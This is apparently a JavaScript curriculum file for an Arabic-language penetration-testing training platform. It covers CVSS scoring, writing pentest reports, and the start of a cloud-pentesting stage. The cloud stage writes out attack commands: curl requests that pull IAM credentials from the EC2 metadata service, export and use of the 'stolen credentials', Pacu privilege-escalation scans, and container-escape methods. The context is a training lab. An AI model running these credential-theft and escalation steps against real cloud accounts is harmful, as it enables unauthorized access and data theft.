          phase: 'Phase 02: Advanced CVSS v4.0 Transition & Subsequent Systems Impact',
          title: 'تطبيق معيار CVSS 4.0 الجديد وتقييم متطلبات الهجوم والأنظمة التابعة',
          action: 'تم تطبيق معيار CVSS 4.0 الجديد الذي يميز بين متطلبات الهجوم المسبقة (Attack Requirements - AT) وتأثير النظام المصاب (Vulnerable System Impact: VC:H/VI:H/VA:H) وتأثير الأنظمة التابعة (Subsequent System Impact: SC:H/SI:H/SA:H)، مما وفر توصيفاً دقيقاً لخطورة قفز المهاجم من حاوية التطبيق للشبكة البنكية الداخلية.',
          detection: 'استخدام نماذج نمذجة التهديدات (STRIDE Threat Modeling) لتوثيق حدود الثقة المتأثرة ومطابقتها مع تصنيفات CVSS v4.0 الحديثة.',
          mitreId: 'T1190',
          link: 'https://www.first.org/cvss/v4-0/calculator/',
          linkText: 'الحاسبة الرسمية لمنظمة FIRST لمعيار CVSS v4.0 الجديد'
        },
        {
          phase: 'Phase 03: Temporal & Environmental Scoring Customization',
          title: 'تعديل الدرجة بناءً على توفر كود الاستغلال العام وتدابير الحماية البيئية',
          action: 'تم احتساب المقياس الزمني للثغرة: توفر PoC استغلالي موثوق في العلن (Exploit Code Maturity: Functional)، ومستوى الترقيع (Remediation Level: Official Fix متوفر من المورد). ثم تم تعديل المقياس البيئي (Environmental Metrics) ليراعي وجود جدار ناري لتطبيقات الويب (WAF) يخفف من احتمالية الاستغلال الخارجي مؤقتاً.',
          detection: 'تدقيق سجلات مسح الثغرات وسجلات جدران الحماية للتحقق من عدم وجود محاولات استغلال نشطة (Active Exploitation) أثناء مرحلة التقييم.',
          mitreId: 'T1595.002',
          link: 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
          linkText: 'دليل المعهد الوطني للمعايير والتقنية NIST SP 800-115 لإدارة وتقييم الثغرات'
        },
        {
          phase: 'Phase 04: Risk Matrix Formulation & Remediation SLA Mapping',
          title: 'بناء مصفوفة المخاطر وجدولة اتفاقيات مستوى الخدمة للترقيع (Remediation SLA)',
          action: 'تم تصنيف الثغرات ضمن مصفوفة المخاطر المؤسسية: إلزام فريق DevOps بإغلاق ثغرة الـ RCE الحرجة (CVSS 9.8) خلال 24 ساعة وفق معيار SLA للثغرات الحرجة، ومعالجة ثغرة BOLA (CVSS 7.5 High) خلال 7 أيام عمل، مع جدولة فحص تحقق أمني (Retesting) للتأكد من نجاح الترقيع.',
          detection: 'إجراء فحص أمني آلي ويدوي لاحق (Verification Scan) للتأكد من إغلاق المنفذ وسد الثغرة دون إحداث آثار جانبية في بيئة الإنتاج.',
          mitreId: 'T1203',
          link: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
          linkText: 'كتالوج الثغرات الأمنية المستغلة فعلياً والمعتمدة رسمياً من CISA (KEV Catalog)'
        }
      ],
      lessonLearned: 'تقييم CVSS ليس مجرد رقم عشوائي، بل هو وثيقة تعاقدية وفنية تحدد أولويات استثمار الموارد وسرعة الترقيع. الفهم العميق لمتجهات Base و Environmental يمنع تهويل الثغرات غير الخطيرة أو التقليل من خطورة الثغرات المدمرة.'
    },
    secretTradecraft: [
      {
        title: 'أسرار تحديد مقياس نطاق التأثير (Scope: Changed vs Unchanged)',
        mitreId: 'N/A',
        category: 'CVSS Scoring Nuances',
        explanation: 'أحد أكثر الأخطاء شيوعاً في تقييمات CVSS 3.1 هو مقياس الـ Scope (S). إذا كانت الثغرة تؤثر فقط على نفس المكون الأمني المصاب (مثلاً استغلال SQLi للسيطرة على قاعدة بيانات التطبيق نفسه)، فإن الـ Scope يظل Unchanged (S:U). ولكن إذا مكنت الثغرة المهاجم من اختراق حدود الأمان والسيطرة على مكون أمني آخر كلياً (مثل ثغرة XSS التي تسرق جلسة المتصفح، أو ثغرة SSRF التي تتيح سحب بيانات بيئة السحابة AWS IAM)، يتحول الـ Scope فوراً إلى Changed (S:C) وترتفع الدرجة والخطورة تلقائياً.',
        detection: 'مراجعة وثائق المعمارية وتخطيط حدود الأمان (Trust Boundaries) قبل اعتماد قيمة مقياس Scope في التقارير الأمنية الرسمية.',
        link: 'https://www.first.org/cvss/v3.1/user-guide#2-2-Scope',
        linkText: 'دليل FIRST المعتمد لشرح وتحديد مقياس نطاق التأثير (Scope Metric) بدقة'
      },
      {
        title: 'تنقية مخرجات الماسحات الآلية من الإيجابيات الكاذبة (False Positive Triaging)',
        mitreId: 'N/A',
        category: 'Vulnerability Triaging Tradecraft',
        explanation: 'الماسحات التلقائية مثل Nessus و Qualys تعتمد بكثرة على فحص الإصدارات المعلنة فقط (Version Banner Checking). في توزيعات لينكس للشركات (مثل Red Hat Enterprise Linux و Debian)، يتم سد الثغرات الأمنية عبر تقنية Backporting دون تغيير رقم الإصدار الأساسي، مما يجعل الماسحات الآلية تصدر تنبيهات كاذبة بوجود ثغرات تم ترقيعها بالفعل! المحترف يقوم دائماً بالتحقق اليدوي عبر قراءة سجلات التعديل (Changelogs) وتشغيل PoC غير ضار للتحقق الفعلي قبل كتابة الثغرة في التقرير.',
        detection: 'مقارنة سجلات تثبيت الحزم (RPM/DEB Changelogs) مع إشعارات الأمان الرسمية الصادرة من الموزع (Vendor Security Bulletins).',
        link: 'https://access.redhat.com/security/updates/backporting',
        linkText: 'توثيق Red Hat الرسمي لآلية الترقيع العكسي (Backporting) والتعامل مع النتائج الكاذبة'
      },
      {
        title: 'دمج مقياس احتمالية الاستغلال الواقعي (EPSS) مع درجات CVSS',
        mitreId: 'N/A',
        category: 'Modern Threat Prioritization',
        explanation: 'يقيس معيار CVSS خطورة الثغرة النظرية المجردة في حال تم استغلالها، بينما يوفر مقياس EPSS (Exploit Prediction Scoring System) نسبة مئوية رياضية (من 0 إلى 1) تعبر عن احتمالية أن يتم استغلال هذه الثغرة فعلياً في الهجمات الحقيقية خلال الـ 30 يوماً القادمة. دمج مقياس EPSS مع CVSS يمنح مديري الأمن قدرة استثنائية على ترقيع الثغرات التي يستهدفها المهاجمون بالفعل، بدلاً من إهدار الموارد على ثغرات نظرية نادرة الحدوث.',
        detection: 'ربط واجهات برمجة التطبيقات (EPSS API) بأنظمة إدارة الثغرات ومقارنة درجات الاحتمالية مع تنبيهات أنظمة الـ Threat Intelligence.',
        link: 'https://www.first.org/epss/',
        linkText: 'بوابة المقياس التنبؤي لاحتمالية استغلال الثغرات في الهجمات الحقيقية (FIRST EPSS)'
      }
    ],
    checklist: [
      { id: 'c17_1', text: 'فهم مقاييس CVSS Base Metrics (AV, AC, PR, UI, S, C, I, A).' },
      { id: 'c17_2', text: 'القدرة على حساب درجة CVSS وتوليد الـ Vector String بدقة.' },
      { id: 'c17_3', text: 'التمييز بين مستويات الخطورة (Low, Medium, High, Critical).' }
    ],
    officialResources: [
      { name: 'FIRST Official CVSS v3.1 Specification', url: 'https://www.first.org/cvss/v3.1/specification-document', type: 'Standards' },
      { name: 'NIST National Vulnerability Database (NVD)', url: 'https://nvd.nist.gov', type: 'Database' }
    ]
  },

  {
    id: 18,
    zoneId: 'zone-reporting',
    titleAr: 'المرحلة 18: كتابة التقارير الاحترافية وتقديم التوصيات (Executive Reporting & Remediation)',
    titleEn: 'Stage 18: Professional Pentest Reporting, Executive Summaries & Remediation',
    tag: 'Reporting & Capstone',
    difficulty: 'خبير — Capstone',
    xpReward: 900,
    position: { x: 35, y: 0, z: 25 },
    brief: 'المنتج النهائي الحقيقي الذي يدفع العميل المال لأجله: هيكلية تقرير اختبار الاختراق الاحترافي، كتابة الملخص التنفيذي للإدارة العليا (Executive Summary)، خطوات إعادة إنتاج الثغرات (PoC)، تقديم توصيات ترقيع دقيقة وقابلة للتطبيق، وعرض النتائج.',
    whyLearn: 'لو اخترقت كل أجهزة الشركة دون تقديم تقرير احترافي وواضح ومقنع، فإن عملك يساوي صفراً! التقرير هو الشيء الوحيد الملموس الذي يستلمه العميل، وهو الذي يحدد ما إذا كانت الشركة ستجدد التعاقد معك أو توصي بك لعملاء آخرين.',
    professionalApplication: 'تقديم التقارير لمجلس الإدارة والمديرين التنفيذيين (C-Suite)، والمطورين (Developers) لإصلاح الأخطاء البرمجية، ومدققي الامتثال واللوائح التنظيمية (Auditors).',
    caseStudy: 'كثير من الشركات ترفض تقارير اختبار الاختراق وتطلب إعادة الفحص إذا كان التقرير مجرد نسخ ولصق لمخرجات Nessus دون تفاصيل توضيحية لخطوات استغلال الثغرة وتأثيرها المالي والتشغيلي على المنشأة.',
    commonMistakes: [
      'كتابة الملخص التنفيذي بمصطلحات تقنية معقدة لا يفهمها المديرون الماليون والتنفيذيون.',
      'عدم توفير خطوات واضحة وقابلة للتكرار (Steps to Reproduce) لإثبات الثغرة للمطورين.',
      'تقديم نصائح ترقيع عامة وسطحية (مثل: قم بتحديث برامجك) بدلاً من تقديم كود برمجي محدد يوضح طريقة سد الثغرة.'
    ],
    detailedGuide: `
### 1. الهيكلية القياسية لتقرير اختبار الاختراق المعتمد عالمياً
1. **صفحة الغلاف (Cover Page):** اسم العميل، عنوان المشروع، أسماء المختبرين، تاريخ التسليم، ومستوى السرية.
2. **إخلاء المسؤولية وقواعد الاختبار (Rules of Engagement & Disclaimers).**
3. **الملخص التنفيذي (Executive Summary):** ملخص موجه لمجلس الإدارة يوضح مستوى الأمان العام بالألوان والمخططات والتأثير المالي على سير العمل.
4. **جدول ملخص الثغرات (Vulnerabilities Summary Matrix):** جدول يوضح عدد الثغرات الحرجة والعالية والمتوسطة والمنخفضة.
5. **التفاصيل الفنية لكل ثغرة (Detailed Technical Findings):**
   * عنوان الثغرة وتصنيف CVSS.
   * الوصف الفني للثغرة ومكان تواجدها.
   * دليل الإثبات العملي خطوة بخطوة (Proof of Concept - PoC).
   * الأثر والمخاطر المترتبة على استغلالها (Impact Analysis).
   * الحل الجذري والتوصيات البرمجية للترقيع (Detailed Remediation).
6. **خاتمة التقرير والملاحق (Conclusion & Clean-up Verification).**
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'توليد وتصدير تقرير اختبار اختراق احترافي بصيغة Markdown / PDF',
        desc: 'استخدام أداة توليد التقارير المدمجة في الموقع لتصدير مسودة تقرير متكاملة جاهزة للتسليم للعميل.',
        command: 'echo "[*] Open Pentest Report Builder in CyberForge Academy -> Fill Scope & Findings -> Click Export Markdown Report (.md)"',
        flags: [
          { flag: 'Report Builder', explanation: 'نظام كتابة وتوليد التقارير المتوافق مع معايير CREST و SANS' }
        ],
        expectedOutput: `Report Generated: CyberForge-Pentest-Report-Executive.md
Total Findings: 3 (Critical: 1, High: 1, Medium: 1)
Status: Ready for Executive Presentation`,
        proTip: 'احرص على ألا تضع كلمات سر حقيقية للعميل في صور التقرير دون تشويشها (Redaction) لحماية خصوصية بيانات العميل.'
      }
    ],
    youtubeVideos: [
      {
        title: 'How to Write a Professional Penetration Testing Report',
        channel: 'The Cyber Mentor',
        duration: '35 دقيقة',
        url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
        keyTakeaway: 'شرح الهيكل الكامل لتقرير الاختراق وكتابة الـ Executive Summary للشركات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'CC: Pen Testing Report Writing', url: 'https://tryhackme.com/r/room/ccpentesting', difficulty: 'Medium', whyMatters: 'فهم ممارسات التوثيق وتوليد التقارير الفنية المعتمدة.' }
    ],
    writeup: {
      title: 'كتابة تقارير اختبار الاختراق الاحترافية المعتمدة وتوثيق الأدلة الجنائية وحلول الترقيع البرمجية',
      scenario: 'إعداد وتسليم تقرير اختبار اختراق متكامل ومطابق لمعايير CREST و SANS بعد اختراق بنية تحتية بنكية تجريبية: بناء ملخص تنفيذي (Executive Summary) موجه لمجلس الإدارة يوضح المخاطر التجارية والمالية، توثيق خطوات إعادة إنتاج الثغرات (PoC) برمجياً مع تشويش البيانات الحساسة (Redaction)، تقديم أكواد ترقيع جاهزة للمطورين، وتنفيذ جلسة Purple Teaming وإقرار إزالة الآثار بالكامل (Cleanup Verification).',
      steps: [
        {
          phase: 'Phase 01: Executive Summary & Financial Impact Translation',
          title: 'صياغة الملخص التنفيذي وترجمة المخاطر الفنية إلى أثر مالي وتشغيلي',
          action: 'تمت كتابة ملخص تنفيذي في صفحة واحدة يخاطب الرئيس التنفيذي ومجلس الإدارة؛ حيث تُرجمت الثغرات المكتشفة إلى مخاطر أعمال واضحة (خطر تسريب بيانات 50 ألف عميل، توقف منصة المدفوعات لمدة 48 ساعة، ومخالفات عدم الامتثال لمعايير PCI-DSS بقيمة تقارب 100 ألف دولار)، مع إرفاق مصفوفة بصرية ملونة توضح الموقف الأمني الإجمالي.',
          detection: 'مراجعة التقرير التنفيذي مع إدارة المخاطر للتأكد من دقة تقديرات الأثر التشغيلي والقانوني ووضوح لغة الأعمال.',
          mitreId: 'N/A',
          link: 'https://www.crest-approved.org/',
          linkText: 'معايير وإرشادات منظمة CREST الدولية لكتابة وتنسيق تقارير اختبار الاختراق'
        },
        {
          phase: 'Phase 02: Reproducible PoC Documentation & Hash Integrity',
          title: 'توثيق خطوات إثبات الثغرة بدقة وتأمين الأدلة الجنائية الرقمية',
          action: 'تم تفصيل كل ثغرة فنية بقسم خاص يتضمن: المسار المصاب (Vulnerable Endpoint)، الحمولات الدقيقة المستخدمة (Exact Payloads)، لقطات شاشة واضحة لطلب واستجابة HTTP عبر Burp Suite، وهاشات SHA-256 للملفات المستخرجة كدليل جنائي مع حجب وتشفير أسماء المستخدمين وأرقام البطاقات الفعلية لحماية خصوصية العميل.',
          detection: 'التحقق من إمكانية إعادة تكرار واستغلال الثغرة (Reproducibility) في بيئة اختبارية للتأكد من صحة الأدلة المقدمة.',
          mitreId: 'N/A',
          link: 'https://github.com/TCM-Security/vulnerability-assessment-and-penetration-testing-report-template',
          linkText: 'نموذج تقرير اختبار الاختراق الاحترافي المعتمد من أكاديمية TCM Security'
        },
        {
          phase: 'Phase 03: Concrete Code Remediation & Developer Guidance',
          title: 'تقديم أكواد برمجية تصحيحية وتوصيات هندسية ملموسة',
          action: 'بدلاً من تقديم نصائح عامة مبهمة، تم تزويد فريق التطوير بأكواد برمجية محددة جاهزة للتطبيق (قبل وبعد الإصلاح): استخدام Prepared Statements في لغة PHP/Node.js لمنع حقن SQL، وإعداد رؤوس الأمان (Content Security Policy - CSP)، وضبط كوكيز الجلسة مع أعلام HttpOnly و Secure و SameSite=Strict.',
          detection: 'فحص كود الترقيع البرمجي المقترح عبر أدوات فحص الكود الساكن (SAST) مثل SonarQube لضمان عدم إنشاء ثغرات جديدة.',
          mitreId: 'N/A',
          link: 'https://cheatsheetseries.owasp.org/',
          linkText: 'سلسلة إرشادات الترقيع والتأمين المعتمدة من منظمة OWASP Cheat Sheet Series'
        },
        {
          phase: 'Phase 04: Post-Engagement Cleanup & Certificate of Sanitation',
          title: 'تنظيف كافة المخلفات والملفات المؤقتة وتوقيع إقرار النظافة',
          action: 'بناءً على سجل العمليات الزمني (Engagement Activity Log)، تم حذف جميع ملفات الويب شيل المؤقتة، وإزالة الحسابات التجريبية المنشأة في Active Directory، ومسح أدوات الفحص من مجلدات C:\\Temp و /tmp، وتقديم شهادة تنظيف موقعة تثبت عودة بيئة العميل لحالتها الطبيعية تماماً.',
          detection: 'مراجعة وتدقيق سجلات الخوادم والـ SIEM للتأكد من عدم بقاء أي أدوات غير مصرح بها أو حسابات خاملة في النظام.',
          mitreId: 'T1070',
          link: 'https://attack.mitre.org/techniques/T1070/',
          linkText: 'توثيق تقنيات إزالة الأدوات والمؤشرات الرقمية بعد العمليات في MITRE ATT&CK'
        }
      ],
      lessonLearned: 'التقرير هو المنتج النهائي الوحيد الذي يدفع العميل ثمنه ويقيس به جودة عملك. دمج لغة الأعمال المالية في الملخص التنفيذي مع الدقة الجراحية والأكواد التصحيحية في التفاصيل الفنية هو ما يصنع الفارق بين مختبر اختراق مبتدئ ومستشار أمني محترف.'
    },
    secretTradecraft: [
      {
        title: 'حجب وتشويش البيانات الحساسة وأرقام البطاقات في التقارير (Data Redaction & Sanitization)',
        mitreId: 'N/A',
        category: 'Legal & Privacy Tradecraft',
        explanation: 'أثناء توثيق الثغرات، قد تحتوي لقطات الشاشة أو مخرجات سحب قواعد البيانات على أرقام بطاقات ائتمان بنكية (PCI Data) أو بيانات شخصية للموظفين أو هاشات كلمات سر إدارية. إرسال هذه البيانات مكشوفة في ملف التقرير يعد خرقاً كارثياً لاتفاقيات عدم الإفصاح (NDA) وقوانين الخصوصية. المحترفون يقومون دائماً بتشويش (Masking / Blurring) الأرقام الحساسة مع إبقاء المعرّفات الأساسية التي تثبت نجاح الاستغلال دون كشف المحتوى السري.',
        detection: 'تمرير مسودات التقارير الأمنية عبر ماسحات منع تسريب البيانات (DLP Solutions) للتحقق التلقائي من خلوها من أي أرقام بطاقات أو كلمات سر مكشوفة قبل إرسالها للعميل.',
        link: 'https://csrc.nist.gov/glossary/term/redaction',
        linkText: 'معايير المعهد الوطني للمعايير والتقنية NIST لعمليات حجب وتشويش البيانات الحساسة'
      },
      {
        title: 'جلسات تفريغ العمليات المشتركة (The Purple Teaming Debrief)',
        mitreId: 'N/A',
        category: 'Purple Teaming Strategy',
        explanation: 'الريد تيم الناجح لا يكتفي بإرسال التقرير بصيغة PDF والرحيل، بل يعقد ورشة عمل تفاعلية مشتركة مع فريق الدفاع (SOC / Blue Team). يتم استعراض كل مرحلة من مراحل الهجوم بالثانية والملي ثانية ومطابقتها مع سجلات الـ SIEM وجدران الحماية: لماذا لم يظهر تنبيه عند سحب كلمات السر؟ كيف تم تجاوز جدار الحماية؟ ثم صياغة قواعد كشف فورية (Sigma Rules & Snort Signatures) لتحويل الهجوم إلى درع حماية دائم.',
        detection: 'حساب مقياس متوسط وقت الاكتشاف (Mean Time to Detect - MTTD) ومتوسط وقت الاستجابة (MTTR) أثناء مراجعة جدول التقرير الزمني مع سجلات المراقبة.',
        link: 'https://sigmahq.github.io/',
        linkText: 'المستودع الرسمي لقواعد Sigma مفتوحة المصدر لتحويل تقارير الهجوم لقواعد رصد دفاعية'
      },
      {
        title: 'الخرائط الحرارية ومخططات مسار الهجوم البصرية (Visual Attack Path Mapping)',
        mitreId: 'N/A',
        category: 'Executive Persuasion & Influence',
        explanation: 'الرؤساء التنفيذيون ومديرو المخاطر لا يملكون الوقت لقراءة 100 صفحة فنية معقدة، لكنهم يفهمون المخططات الانسيابية. بناء مخطط بصري يوضح مسار الهجوم المتسلسل (Attack Path Graph: من ثغرة XSS بسيطة في موقع فرعي إلى القفز إلى الخادم الداخلي ثم السيطرة على خادم النطاق الرئيسي) مصحوباً بخريطة حرارية (Risk Heatmap) هو العامل الحاسم الذي يدفع الإدارة لإقرار ميزانيات الأمان وسد الثغرات فوراً دون تردد.',
        detection: 'مطابقة مخططات الهجوم مع أطر ومصفوفات إدارة المخاطر المعتمدة عالمياً مثل ISO/IEC 27005 و FAIR Framework.',
        link: 'https://www.sans.org/white-papers/1199/',
        linkText: 'ورقة بحثية من معهد SANS حول أساليب بناء المقاييس الأمنية ومصفوفات المخاطر للمديرين'
      }
    ],
    checklist: [
      { id: 'c18_1', text: 'إتقان صياغة الملخص التنفيذي (Executive Summary) الموجه لمجلس الإدارة.' },
      { id: 'c18_2', text: 'كتابة خطوات إثبات الثغرة (PoC) بدقة وتوثيق الصور والأدلة.' },
      { id: 'c18_3', text: 'تقديم توصيات برمجية وهندسية دقيقة لترقيع كل ثغرة.' }
    ],
    officialResources: [
      { name: 'SANS Institute Reading Room: Writing a Penetration Testing Report', url: 'https://www.sans.org', type: 'Whitepaper' },
      { name: 'TCM Security Sample Pentest Report (GitHub)', url: 'https://github.com/TCM-Security/vulnerability-assessment-and-penetration-testing-report-template', type: 'Template' }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════
  // STAGE 19: Cloud Pentesting, AWS/Azure IAM & Container Breakouts
  // ═══════════════════════════════════════════════════════════════════════
  {
    id: 19,
    zoneId: 'zone-cloud',
    titleAr: 'المرحلة 19: اختبار اختراق البيئات السحابية وأمان الحاويات (Cloud Pentesting & Container Breakouts)',
    titleEn: 'Stage 19: Cloud Pentesting — AWS/Azure IAM Exploitation, Container Escapes & Serverless Attacks',
    tag: 'Cloud & Containers',
    difficulty: 'متقدم — Advanced',
    xpReward: 950,
    position: { x: -35, y: 0, z: 35 },
    brief: 'الغوص العميق في أمان البيئات السحابية: استغلال أخطاء IAM Policies في AWS وAzure، هجمات SSRF على Instance Metadata Service (IMDSv1 vs IMDSv2)، فحص وتدقيق S3 Buckets المكشوفة، الهروب من Docker Containers عبر /var/run/docker.sock والـ Capabilities المرتفعة، واختبار أمان Kubernetes RBAC وSecret Management.',
    whyLearn: 'أكثر من 94% من المؤسسات الكبرى نقلت أحمال عملها للسحابة، وأغلب الاختراقات الكبرى في 2024-2026 كانت بسبب أخطاء Cloud Misconfiguration مش ثغرات تقليدية. لو مش فاهم IAM وS3 وIMDS وKubernetes — أنت بتختبر نص البنية التحتية بس وبتسيب النص التاني مفتوح.',
    professionalApplication: 'فرق الريد تيم في الشركات الكبرى بقت بتطلب Cloud Pentesting كجزء أساسي من كل Engagement. شهادات زي AWS Security Specialty وAZ-500 وCertified Kubernetes Security Specialist (CKS) بقت مطلوبة بشكل متزايد. القدرة على اكتشاف IAM Privilege Escalation paths هي من أهم المهارات المطلوبة حالياً.',
    caseStudy: 'اختراق Capital One 2019: المهاجم استغل SSRF vulnerability في WAF عشان يوصل لـ EC2 Instance Metadata Service (IMDSv1) ويسحب IAM Role credentials، واللي استخدمها بعد كده عشان يوصل لـ S3 buckets فيها بيانات أكتر من 100 مليون عميل. الهجمة كانت ممكن تتمنع لو AWS كانت مفعلة IMDSv2 واستخدمت Least Privilege IAM policies.',
    commonMistakes: [
      'استخدام IAM User credentials بدل IAM Roles للـ EC2 instances — ده بيعرض الـ Access Keys لو الـ instance اتاخد.',
      'ترك S3 Buckets بـ Public ACLs أو بدون Server-Side Encryption — أكتر من 30% من data breaches في السحابة بسبب ده.',
      'عدم تقييد Docker container capabilities وتشغيل containers بـ --privileged mode — ده بيسمح بالهروب الكامل للـ Host.',
      'إهمال فحص Kubernetes RBAC permissions وترك default service accounts بصلاحيات cluster-admin.',
      'عدم تفعيل CloudTrail/Azure Activity Log — بدونهم مفيش أي visibility على اللي بيحصل في البيئة السحابية.'
    ],
    detailedGuide: `
### 1. أساسيات البنية التحتية السحابية (Cloud Infrastructure Fundamentals)
قبل ما تبدأ تختبر، لازم تفهم المكونات الأساسية:
* **IaaS (Infrastructure as a Service):** EC2/Azure VMs — أنت مسؤول عن الـ OS والـ patching.
* **PaaS (Platform as a Service):** Elastic Beanstalk/Azure App Service — المزود بيدير الـ infrastructure.
* **SaaS (Software as a Service):** Office 365/Google Workspace — بتستخدم التطبيق جاهز.
* **Shared Responsibility Model:** AWS/Azure مسؤولين عن أمان الـ infrastructure، وأنت مسؤول عن أمان الـ configuration والـ data.

### 2. AWS IAM Deep Dive — الفهم العميق لنظام الصلاحيات
IAM (Identity and Access Management) هو قلب أمان AWS:
* **Users:** حسابات بشرية بـ Access Key ID و Secret Access Key.
* **Roles:** هويات مؤقتة بتترتبط بـ EC2 instances أو Lambda functions — الأفضل من Users.
* **Policies:** JSON documents بتحدد مين يقدر يعمل إيه على أي resource.
* **Policy Evaluation Logic:** Explicit Deny > Explicit Allow > Implicit Deny.
* **Privilege Escalation Paths:** لو عندك iam:PassRole + lambda:CreateFunction = ممكن تعمل escalation لـ admin.

### 3. هجمات Instance Metadata Service (IMDS)
كل EC2 instance عندها metadata endpoint على 169.254.169.254:
* **IMDSv1:** GET request عادي بدون authentication — عرضة لـ SSRF attacks.
* **IMDSv2:** محتاج PUT request الأول عشان تاخد token، وبعدين تستخدم الـ token — أأمن بكتير.
* **الخطر:** لو وصلت للـ metadata عبر SSRF، تقدر تسحب IAM Role credentials وتستخدمها من برا.

### 4. S3 Bucket Security Auditing
* **Bucket ACLs vs Bucket Policies:** الاتنين ممكن يتعارضوا وده بيسبب مشاكل أمنية.
* **Block Public Access:** لازم يكون مفعل على مستوى الـ Account وعلى كل Bucket.
* **Versioning + MFA Delete:** عشان تمنع حذف البيانات الحساسة.
* **Server-Side Encryption:** SSE-S3 أو SSE-KMS لتشفير البيانات at rest.

### 5. Docker Container Escapes
الهروب من الحاوية للـ Host هو Holy Grail بتاع Container Pentesting:
* **/var/run/docker.sock:** لو mounted جوه الـ container، تقدر تتحكم في Docker daemon بالكامل.
* **--privileged flag:** بيدي الـ container كل الـ Linux capabilities — ممكن تعمل mount للـ host filesystem.
* **CAP_SYS_ADMIN + cgroup escape:** تقدر تكتب في cgroup release_agent وتنفذ commands على الـ Host.
* **Kernel Exploits:** لو الـ kernel version قديم، ممكن تستغل CVEs زي Dirty COW أو OverlayFS.

### 6. Kubernetes (K8s) Security
* **RBAC:** Role-Based Access Control — تأكد إن الـ service accounts عندها least privilege.
* **Secrets:** بتتخزن as base64 (مش encrypted!) في etcd — لازم تفعل encryption at rest.
* **Network Policies:** بدونها، كل pod يقدر يكلم أي pod تاني — lateral movement سهل جداً.
* **Pod Security Standards:** Restricted > Baseline > Privileged.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'إعداد بيئة AWS للتدريب باستخدام LocalStack أو CloudGoat',
        desc: 'تثبيت LocalStack لمحاكاة خدمات AWS محلياً، أو استخدام CloudGoat من Rhino Security Labs كـ vulnerable-by-design AWS environment.',
        command: '# Option 1: LocalStack (Free, Local)\npip install localstack\nlocalstack start -d\naws --endpoint-url=http://localhost:4566 s3 ls\n\n# Option 2: CloudGoat (Realistic AWS Scenarios)\ngit clone https://github.com/RhinoSecurityLabs/cloudgoat.git\ncd cloudgoat\npip install -r requirements.txt\npython3 cloudgoat.py config profile\npython3 cloudgoat.py create iam_privesc_by_rollback',
        flags: [
          { flag: 'localstack start -d', explanation: 'تشغيل LocalStack كـ daemon في الخلفية — بيحاكي أكتر من 70 خدمة AWS محلياً بدون تكلفة' },
          { flag: '--endpoint-url', explanation: 'توجيه AWS CLI للـ LocalStack بدل AWS الحقيقي' },
          { flag: 'iam_privesc_by_rollback', explanation: 'سيناريو CloudGoat لتصعيد الصلاحيات عبر IAM Policy Version Rollback' }
        ],
        expectedOutput: '[+] LocalStack running on http://localhost:4566\n[+] S3, IAM, Lambda, EC2 services available\n\n# CloudGoat Output:\ncloudgoat_output_iam_privesc_by_rollback:\n  Raynor:\n    access_key_id: AKIA...EXAMPLE\n    secret_access_key: ****\n    username: raynor',
        proTip: 'CloudGoat بيعمل real AWS resources — اتأكد إنك بتستخدم AWS account مخصص للتدريب وبتعمل destroy بعد ما تخلص عشان ما تتفاجأش بفواتير.'
      },
      {
        step: 2,
        title: 'فحص IAM Policies واكتشاف Privilege Escalation Paths',
        desc: 'استخدام أدوات enumerate-iam و Pacu لاكتشاف الصلاحيات الحالية والبحث عن مسارات التصعيد.',
        command: '# Enumerate current IAM permissions\npip install enumerate-iam\npython enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n\n# Use Pacu (AWS Exploitation Framework)\ngit clone https://github.com/RhinoSecurityLabs/pacu.git\ncd pacu && pip install -r requirements.txt\npython3 cli.py\n# Inside Pacu:\nset_keys\nrun iam__enum_permissions\nrun iam__privesc_scan',
        flags: [
          { flag: 'enumerate-iam', explanation: 'بيختبر كل API call ممكنة عشان يعرف إيه الصلاحيات الفعلية — مش بس اللي مكتوبة في الـ Policy' },
          { flag: 'iam__privesc_scan', explanation: 'بيدور على 21+ طريقة معروفة لتصعيد الصلاحيات في AWS IAM' }
        ],
        expectedOutput: '[+] Confirmed permissions for AKIA...:\n  - iam:ListPolicies\n  - iam:ListPolicyVersions\n  - iam:SetDefaultPolicyVersion  <-- CRITICAL: Can rollback to older, more permissive policy!\n  - s3:ListBucket\n  - s3:GetObject\n\n[PRIVESC] iam:SetDefaultPolicyVersion allows privilege escalation via policy version rollback!',
        proTip: 'دايماً ابدأ بـ iam:Get* و iam:List* — الصلاحيات دي لوحدها ممكن تكشفلك مسارات escalation كاملة من غير ما تعمل أي تغيير.'
      },
      {
        step: 3,
        title: 'استغلال SSRF للوصول لـ EC2 Instance Metadata (IMDS)',
        desc: 'محاكاة هجمة SSRF على تطبيق ويب يعمل على EC2 للوصول لـ IAM Role credentials عبر IMDSv1.',
        command: '# Test IMDSv1 (Classic - Vulnerable)\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role\n\n# Test IMDSv2 (Token-Required - Secure)\nTOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/\n\n# Use stolen credentials\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws sts get-caller-identity\naws s3 ls',
        flags: [
          { flag: '169.254.169.254', explanation: 'Link-Local address خاص بـ EC2 metadata — كل instance عندها واحد' },
          { flag: 'iam/security-credentials/', explanation: 'المسار اللي بيرجع اسم الـ IAM Role المرتبط بالـ instance' },
          { flag: 'X-aws-ec2-metadata-token-ttl-seconds', explanation: 'في IMDSv2، لازم تطلب token الأول — ده بيمنع SSRF attacks' }
        ],
        expectedOutput: '{\n  "Code": "Success",\n  "AccessKeyId": "ASIA...",\n  "SecretAccessKey": "...",\n  "Token": "...",\n  "Expiration": "2026-09-30T02:00:00Z"\n}',
